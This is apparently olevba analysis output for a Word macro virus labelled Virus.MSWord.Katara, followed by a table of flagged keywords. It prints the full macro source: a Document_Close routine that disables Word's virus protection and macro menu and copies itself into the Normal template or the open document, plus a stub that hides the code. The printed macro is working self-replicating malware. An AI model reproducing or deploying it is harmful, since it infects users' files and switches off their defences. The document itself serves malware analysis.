olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Katara
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Katara - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
Application.EnableCancelKey = wCancelDisabled
Application.DisplayStatusBar = False
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Aloha = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 18)
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
Set Host = Target.VBProject.VBComponents.Item(1).CodeModule
Host.DeleteLines 1, Host.CountOfLines
Host.AddFromString Aloha
If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
MsgBox "ClassModule ZG012700", 0, "BSL4"
End Sub
Sub ViewVBCode()
MsgBox "Cannot export module class", 16
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

